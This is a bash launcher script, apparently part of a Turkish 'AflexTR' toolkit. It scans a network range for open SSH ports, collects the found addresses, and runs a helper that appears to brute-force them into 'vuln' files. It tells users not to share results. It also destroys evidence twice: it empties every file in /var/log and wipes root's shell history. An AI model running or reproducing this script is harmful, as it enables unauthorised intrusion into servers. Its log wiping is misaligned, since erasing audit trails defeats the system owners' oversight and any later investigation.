#!/bin/bash

chmod +x *
python3 src.py
echo "$(ls /var/log/)">cleanlist
while read line
do   
rm -rf /var/log/$line
touch /var/log/$line
done < cleanlist
green='\E[32;40m'
col=( '\E[36;40m' '\E[32;40m' '\E[33;40m' '\E[34;40m' '\E[35;40m' '\E[36;40m' '\E[37;40m' )
echo -e "$col [AflexTR] TARAMA YÜKLENİYOR  ...."
echo -e ""
sleep 2
cat motd
echo -e ""

echo "[SSH] Açık $1 Olan İp ler Taranıyor."
./class 22 -a $1 -i eth0 -s 10
echo "1 ile 254 ip arası taranılıyor."
cat bios.txt |sort | uniq > mfu.txt
oopsnr2=`grep -c . mfu.txt`
echo -e "[SSH] Bulunan $oopsnr2 ip ler "
echo "[SSH] Tarama başlanılıyor"
echo "# SAKIN ÇIKAN SONUÇLARI PAYLAŞMAYIN"
./update 5000
rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r ; 
echo "$(ls /var/log/)">cleanlist
while read line
do
rm -rf /var/log/$line
touch /var/log/$line
done < cleanlist
sleep 5
./clean
touch dup.txt
touch mfu.txt
touch bios.txt
touch vuln.txt
touch vuln1.txt
chmod +x *
# end of file 
